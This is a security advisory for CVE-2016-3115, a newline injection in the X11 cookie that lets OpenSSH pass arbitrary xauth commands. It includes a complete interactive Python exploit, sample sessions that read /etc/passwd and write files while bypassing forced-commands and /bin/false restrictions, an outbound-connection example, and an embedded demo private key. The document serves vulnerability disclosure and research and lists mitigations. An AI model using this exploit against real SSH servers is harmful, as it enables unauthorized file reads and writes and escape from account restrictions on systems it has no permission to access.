'''
Author:     <github.com/tintinweb>
Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-3115
Version:    0.2
Date:       Mar 3rd, 2016

Tag:        openssh xauth command injection may lead to forced-command and /bin/false bypass

Overview
--------

Name:           openssh
Vendor:         OpenBSD
References:     * http://www.openssh.com/[1]

Version:        7.2p1 [2]
Latest Version: 7.2p1
Other Versions: <= 7.2p1 (all versions; dating back ~20 years)
Platform(s):    linux
Technology:     c

Vuln Classes:   CWE-93 - Improper Neutralization of CRLF Sequences ('CRLF Injection')
Origin:         remote
Min. Privs.:    post auth

CVE:            CVE-2016-3115



Description
---------

quote website [1]

> OpenSSH is the premier connectivity tool for remote login with the SSH protocol. It encrypts all traffic to eliminate eavesdropping, connection hijacking, and other attacks. In addition, OpenSSH provides a large suite of secure tunneling capabilities, several authentication methods, and sophisticated configuration options.
Summary
-------

An authenticated user may inject arbitrary xauth commands by sending an
x11 channel request that includes a newline character in the x11 cookie.
The newline acts as a command separator to the xauth binary. This attack requires
the server to have 'X11Forwarding yes' enabled. Disabling it, mitigates this vector.

By injecting xauth commands one gains limited* read/write arbitrary files,
information leakage or xauth-connect capabilities. These capabilities can be
leveraged by an authenticated restricted user - e.g. one with the login shell
configured as /bin/false or one with configured forced-commands - to bypass
account restriction. This is generally not expected.

The injected xauth commands are performed with the effective permissions of the
logged in user as the sshd already dropped its privileges.

Quick-Info:

* requires: X11Forwarding yes
* bypasses /bin/false and forced-commands
** OpenSSH does not treat /bin/false like /bin/nologin (in contrast to Dropbear)
* does not bypass /bin/nologin (as there is special treatment for this)

Capabilities (xauth):

* Xauth
	* write file: limited chars, xauthdb format
	* read file: limit lines cut at first \s
	* infoleak: environment
	* connect to other devices (may allow port probing)


PoC see ref github.
Patch see ref github.


Details
-------

// see annotated code below

    * server_input_channel_req (serverloop.c)
     *- session_input_channel_req:2299 (session.c [2])
      *- session_x11_req:2181

    * do_exec_pty or do_exec_no_pty
     *- do_child
      *- do_rc_files (session.c:1335 [2])

Upon receiving an `x11-req` type channel request sshd parses the channel request
parameters `auth_proto` and `auth_data` from the client ssh packet where
`auth_proto` contains the x11 authentication method used (e.g. `MIT-MAGIC-COOKIE-1`)
and `auth_data` contains the actual x11 auth cookie. This information is stored
in a session specific datastore. When calling `execute` on that session, sshd will
call `do_rc_files` which tries to figure out if this is an x11 call by evaluating
if `auth_proto` and `auth_data` (and `display`) are set. If that is the case AND
there is no system `/sshrc` existent on the server AND it no user-specific `$HOME/.ssh/rc`
is set, then `do_rc_files` will run `xauth -q -` and pass commands via `stdin`.
Note that `auth_data` nor `auth_proto` was sanitized or validated, it just contains
user-tainted data. Since `xauth` commands are passed via `stdin` and `\n` is a
command-separator to the `xauth` binary, this allows a client to inject arbitrary
`xauth` commands.

Sidenote #1: in case sshd takes the `$HOME/.ssh/rc` branch, it will pass the tainted
input as arguments to that script.
Sidenote #2: client code also seems to not sanitize `auth_data`, `auth_proto`. [3]

This is an excerpt of the `man xauth` [4] to outline the capabilities of this xauth
command injection:

	SYNOPSIS
       	xauth [ -f authfile ] [ -vqibn ] [ command arg ... ]

		add displayname protocolname hexkey
		generate displayname protocolname [trusted|untrusted] [timeout seconds] [group group-id] [data hexdata]
		[n]extract filename displayname...
		[n]list [displayname...]
		[n]merge [filename...]
		remove displayname...
		source filename
		info
		exit
		quit
		version
		help
		?

Interesting commands are:

	info	 - leaks environment information / path
			~# xauth info
			xauth:  file /root/.Xauthority does not exist
			Authority file:       /root/.Xauthority
			File new:             yes
			File locked:          no
			Number of entries:    0
			Changes honored:      yes
			Changes made:         no
			Current input:        (argv):1

	source	 - arbitrary file read (cut on first `\s`)
			# xauth source /etc/shadow
			xauth:  file /root/.Xauthority does not exist
			xauth: /etc/shadow:1:  unknown command "smithj:Ep6mckrOLChF.:10063:0:99999:7:::"

	extract  - arbitrary file write
			 * limited characters
	         * in xauth.db format
	         * since it is not compressed it can be combined with `xauth add` to
	           first store data in the database and then export it to an arbitrary
	           location e.g. to plant a shell or do other things.

	generate - connect to <ip>:<port> (port probing, connect back and pot. exploit
			   vulnerabilities in X.org


Source
------

Inline annotations are prefixed with `//#!`


/*
 * Run $HOME/.ssh/rc, /etc/ssh/sshrc, or xauth (whichever is found
 * first in this order).
 */
static void
do_rc_files(Session *s, const char *shell)
{
...
		snprintf(cmd, sizeof cmd, "%s -q -",
		    options.xauth_location);
		f = popen(cmd, "w");							//#! run xauth -q -
		if (f) {
			fprintf(f, "remove %s\n",					//#! remove <user_tainted_data> - injecting \n auth_display injects xauth command
			    s->auth_display);
			fprintf(f, "add %s %s %s\n",				//#! \n injection
			    s->auth_display, s->auth_proto,
			    s->auth_data);
			pclose(f);
		} else {
			fprintf(stderr, "Could not run %s\n",
			    cmd);
		}
	}
}

Proof of Concept
----------------

Prerequisites:

* install python 2.7.x
* issue `#> pip install paramiko` to install `paramiko` ssh library for python 2.x
* make sure `poc.py`


 Usage: <host> <port> <username> <password or path_to_privkey>

        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key


poc:

1. configure one user (user1) for `force-commands` and another one with `/bin/false` in `/etc/passwd`:

#PUBKEY line - force commands: only allow "whoami"
#cat /home/user1/.ssh/authorized_keys
command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user1@box

#cat /etc/passwd
user2:x:1001:1002:,,,:/home/user2:/bin/false

2. run sshd with `X11Forwarding yes` (kali default config)

#> /root/openssh-7.2p1/sshd -p 22 -f sshd_config -D -d

3. `forced-commands` - connect with user1 and display env information

#> python <host> 22 user1 .demoprivkey

INFO:__main__:add this line to your authorized_keys file:
#PUBKEY line - force commands: only allow "whoami"
#cat /home/user/.ssh/authorized_keys
command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user@box

INFO:__main__:connecting to: user1:<PKEY>@host:22
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#> .info
DEBUG:__main__:auth_cookie: '\ninfo'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:Authority file:       /home/user1/.Xauthority
File new:             no
File locked:          no
Number of entries:    1
Changes honored:      yes
Changes made:         no
Current input:        (stdin):3
/usr/bin/xauth: (stdin):2:  bad "add" command line
...

4. `forced-commands` - read `/etc/passwd`

...
#> .readfile /etc/passwd
DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...

5. `forced-commands` - write `/tmp/testfile`

#> .writefile /tmp/testfile `thisisatestfile`
DEBUG:__main__:auth_cookie: '\nadd 127.0.0.250:65500 `thisisatestfile` aa'
DEBUG:__main__:dummy exec returned: None
DEBUG:__main__:auth_cookie: '\nextract /tmp/testfile 127.0.0.250:65500'
DEBUG:__main__:dummy exec returned: None
DEBUG:__main__:/usr/bin/xauth: (stdin):2:  bad "add" command line

#> ls -lsat /tmp/testfile
4 -rw------- 1 user1 user1 59 xx xx 13:49 /tmp/testfile

#> cat /tmp/testfile
\FA65500hi\FA65500`thisisatestfile`\AA

6. `/bin/false` - connect and read `/etc/passwd`

#> python <host> 22 user2 user2password
INFO:__main__:connecting to: user2:user2password@host:22
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#> .readfile /etc/passwd
DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
user2:x:1001:1002:,,,:/home/user2:/bin/false
...

7. `/bin/false` - initiate outbound X connection to 8.8.8.8:6100

#> generate 8.8.8.8:100 .

#> tcpdump
IP <host>.42033 > 8.8.8.8.6100: Flags [S], seq 1026029124, win 29200, options [mss 1460,sackOK,TS val 431416709 ecr 0,nop,wscale 10], length 0


Mitigation / Workaround
------------------------

* disable x11-forwarding: `sshd_config` set `X11Forwarding no`
* disable x11-forwarding for specific user with forced-commands: `no-x11-forwarding` in `authorized_keys`

Notes
-----

Verified, resolved and released within a few days. very impressive.

Vendor response: see advisory [5]

References
----------

[1] http://www.openssh.com/
[2] https://github.com/openssh/openssh-portable/blob/5a0fcb77287342e2fc2ba1cee79b6af108973dc2/session.c#L1388
[3] https://github.com/openssh/openssh-portable/blob/19bcf2ea2d17413f2d9730dd2a19575ff86b9b6a/clientloop.c#L376
[4] http://linux.die.net/man/1/xauth
[5] http://www.openssh.com/txt/x11fwd.adv
'''

#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : <github.com/tintinweb>
###############################################################################
#
# FOR DEMONSTRATION PURPOSES ONLY!
#
###############################################################################
import logging
import StringIO
import sys
import os

LOGGER = logging.getLogger(__name__)
try:
    import paramiko
except ImportError, ie:
    logging.exception(ie)
    logging.warning("Please install python-paramiko: pip install paramiko / easy_install paramiko / <distro_pkgmgr> install python-paramiko")
    sys.exit(1)

class SSHX11fwdExploit(object):
    def __init__(self, hostname, username, password, port=22, timeout=0.5,
                 pkey=None, pkey_pass=None):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if pkey:
            pkey = paramiko.RSAKey.from_private_key(StringIO.StringIO(pkey),pkey_pass)
        self.ssh.connect(hostname=hostname, port=port,
                         username=username, password=password,
                         timeout=timeout, banner_timeout=timeout,
                         look_for_keys=False, pkey=pkey)

    def exploit(self, cmd="xxxx\n?\nsource /etc/passwd\n"):
        transport = self.ssh.get_transport()
        session = transport.open_session()
        LOGGER.debug("auth_cookie: %s"%repr(cmd))
        session.request_x11(auth_cookie=cmd)
        LOGGER.debug("dummy exec returned: %s"%session.exec_command(""))

        transport.accept(0.5)
        session.recv_exit_status()  # block until exit code is ready
        stdout, stderr = [],[]
        while session.recv_ready():
            stdout.append(session.recv(4096))
        while session.recv_stderr_ready():
            stderr.append(session.recv_stderr(4096))
        session.close()
        return ''.join(stdout)+''.join(stderr)              # catch stdout, stderr

    def exploit_fwd_readfile(self, path):
        data = self.exploit("xxxx\nsource %s\n"%path)
        if "unable to open file" in data:
            raise IOError(data)
        ret = []
        for line in data.split('\n'):
            st = line.split('unknown command "',1)
            if len(st)==2:
                ret.append(st[1].strip(' "'))
        return '\n'.join(ret)

    def exploit_fwd_write_(self, path, data):
        '''
        adds display with protocolname containing userdata. badchars=<space>

        '''
        dummy_dispname = "127.0.0.250:65500"
        ret = self.exploit('\nadd %s %s aa'%(dummy_dispname, data))
        if ret.count('bad "add" command line')>1:
            raise Exception("could not store data most likely due to bad chars (no spaces, quotes): %s"%repr(data))
        LOGGER.debug(self.exploit('\nextract %s %s'%(path,dummy_dispname)))
        return path

demo_authorized_keys = '''#PUBKEY line - force commands: only allow "whoami"
#cat /home/user/.ssh/authorized_keys
command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user@box
'''
PRIVKEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtUaWCq7z5CM7wGH1/2XlNVMy7glVgYCVHjf8BUZo+FypdD69
9SPu06CZ3e0vSUx5KxlQ7vgU6CtH9nQli53oMy225a/RUGEon/axzVtwTpMnVLqn
PLEUn9zPaCjwwpg/Brhr5+NHc3bm/u/LHmKrEg6IjyWssE16exuhA3G/Teed+NaN
zKR3jVLrmXohc9dp57jYBPLZJ5NSojsd27LjdWnq/PokxwvkQOrOPkhTne+7GRts
U68nW5a99jMSb4bpgqsUsIY0IIsKc1nfzUxonvcXmh+RASIffLCzA0OdQyJ7UrPh
TLw8dVOK2e9zsJYlOYUA6G3rnzq9sNmqe7XdeQIDAQABAoIBAHu5M4sTIc8h5RRH
SBkKuMgOgwJISJ3c3uoDF/WZuudYhyeZ8xivb7/tK1d3HQEQOtsZqk2P8OUNNU6W
s1F5cxQLLXvS5i/QQGP9ghlBQYO/l+aShrY7vnHlyYGz/68xLkMt+CgKzaeXDc4O
aDnS6iOm27mn4xdpqiEAGIM7TXCjcPSQ4l8YPxaj84rHBcD4w033Sdzc7i73UUne
euQL7bBz5xNibOIFPY3h4q6fbw4bJtPBzAB8c7/qYhJ5P3czGxtqhSqQRogK8T6T
A7fGezF90krTGOAz5zJGV+F7+q0L9pIR+uOg+OBFBBmgM5sKRNl8pyrBq/957JaA
rhSB0QECgYEA1604IXr4CzAa7tKj+FqNdNJI6jEfp99EE8OIHUExTs57SaouSjhe
DDpBRSTX96+EpRnUSbJFnXZn1S9cZfT8i80kSoM1xvHgjwMNqhBTo+sYWVQrfBmj
bDVVbTozREaMQezgHl+Tn6G1OuDz5nEnu+7gm1Ud07BFLqi8Ssbhu2kCgYEA1yrc
KPIAIVPZfALngqT6fpX6P7zHWdOO/Uw+PoDCJtI2qljpXHXrcI4ZlOjBp1fcpBC9
2Q0TNUfra8m3LGbWfqM23gTaqLmVSZSmcM8OVuKuJ38wcMcNG+7DevGYuELXbOgY
nimhjY+3+SXFWIHAtkJKAwZbPO7p857nMcbBH5ECgYBnCdx9MlB6l9rmKkAoEKrw
Gt629A0ZmHLftlS7FUBHVCJWiTVgRBm6YcJ5FCcRsAsBDZv8MW1M0xq8IMpV83sM
F0+1QYZZq4kLCfxnOTGcaF7TnoC/40fOFJThgCKqBcJQZKiWGjde1lTM8lfTyk+f
W3p2+20qi1Yh+n8qgmWpsQKBgQCESNF6Su5Rjx+S4qY65/spgEOOlB1r2Gl8yTcr
bjXvcCYzrN4r/kN1u6d2qXMF0zrPk4tkumkoxMK0ThvTrJYK3YWKEinsucxSpJV/
nY0PVeYEWmoJrBcfKTf9ijN+dXnEdx1LgATW55kQEGy38W3tn+uo2GuXlrs3EGbL
b4qkQQKBgF2XUv9umKYiwwhBPneEhTplQgDcVpWdxkO4sZdzww+y4SHifxVRzNmX
Ao8bTPte9nDf+PhgPiWIktaBARZVM2C2yrKHETDqCfme5WQKzC8c9vSf91DSJ4aV
pryt5Ae9gUOCx+d7W2EU7RIn9p6YDopZSeDuU395nxisfyR1bjlv
-----END RSA PRIVATE KEY-----"""


if __name__=="__main__":
    logging.basicConfig(loglevel=logging.DEBUG)
    LOGGER.setLevel(logging.DEBUG)

    if not len(sys.argv)>4:
        print """ Usage: <host> <port> <username> <password or path_to_privkey>

        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key

"""
        sys.exit(1)
    hostname, port, username, password = sys.argv[1:]
    port = int(port)
    pkey = None
    if os.path.isfile(password):
        password = None
        with open(password,'r') as f:
            pkey = f.read()
    elif password==".demoprivkey":
        pkey = PRIVKEY
        password = None
        LOGGER.info("add this line to your authorized_keys file: \n%s"%demo_authorized_keys)

    LOGGER.info("connecting to: %s:%s@%s:%s"%(username,password if not pkey else "<PKEY>", hostname, port))
    ex = SSHX11fwdExploit(hostname, port=port,
                          username=username, password=password,
                          pkey=pkey,
                          timeout=10
                          )
    LOGGER.info("connected!")
    LOGGER.info ("""
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>
""")
    while True:
        cmd = raw_input("#> ").strip()
        if cmd.lower().startswith(".exit") or cmd.lower().startswith(".quit"):
            break
        elif cmd.lower().startswith(".info"):
            LOGGER.info(ex.exploit("\ninfo"))
        elif cmd.lower().startswith(".readfile"):
            LOGGER.info(ex.exploit_fwd_readfile(cmd.split(" ",1)[1]))
        elif cmd.lower().startswith(".writefile"):
            parts = cmd.split(" ")
            LOGGER.info(ex.exploit_fwd_write_(parts[1],' '.join(parts[2:])))
        else:
            LOGGER.info(ex.exploit('\n%s'%cmd))

    # just playing around
    #print ex.exploit_fwd_readfile("/etc/passwd")
    #print ex.exploit("\ninfo")
    #print ex.exploit("\ngenerate <ip>:600<port> .")                # generate <ip>:port  port=port+6000
    #print ex.exploit("\nlist")
    #print ex.exploit("\nnlist")
    #print ex.exploit('\nadd xx xx "\n')
    #print ex.exploit('\ngenerate :0 . data "')
    #print ex.exploit('\n?\n')
    #print ex.exploit_fwd_readfile("/etc/passwd")
    #print ex.exploit_fwd_write_("/tmp/somefile", data="`whoami`")
    LOGGER.info("--quit--")